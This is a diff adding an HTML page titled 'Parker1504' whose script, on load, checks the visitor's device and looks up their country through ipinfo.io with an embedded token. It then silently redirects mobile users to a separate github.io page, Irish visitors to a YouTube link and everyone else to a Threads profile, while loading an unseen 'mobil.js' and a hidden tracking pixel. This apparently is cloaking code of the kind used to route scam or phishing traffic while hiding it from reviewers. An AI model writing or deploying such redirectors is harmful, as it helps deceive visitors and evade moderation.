@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Parker1504</title>
+    <script>
+        function redirectToDifferentWebsite() {
+            var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(navigator.userAgent.toLowerCase());
+            var mobileDevice = "https://watch9920.github.io/main.html";
+            var pcURL = "https://www.threads.net/@zuck"; 
+            var mobileURL = mobileDevice;
+            var irelandURL = "https://youtu.be/QO6MlOCQwF4"; // Replace this with the desired URL for visitors from Ireland
+        
+            // Get the visitor's country using ipinfo.io API
+            fetch('https://ipinfo.io?token=74eaddd4400f3a')
+                .then(response => response.json())
+                .then(data => {
+                    var country = data.country;
+                    if (isMobile) {
+                        window.location.href = mobileURL;
+                    } else {
+                        if (country === 'IE') { // 'IE' is the country code for Ireland
+                            window.location.href = irelandURL;
+                        } else {
+                            window.location.href = pcURL;
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP info:', error);
+                    // If the API call fails, use a default redirection (e.g., to the desktop URL)
+                    window.location.href = pcURL;
+                });
+        }
+        
+        redirectToDifferentWebsite();
+        </script>
+    <script src="mobil.js"></script>
+</head>
+<body>
+    <img src="//whos.amung.us/pingjs/?k=powermoney9&t= GHOST &x=Youtube.com" style="display:none" alt="">
+</body>
+</html>
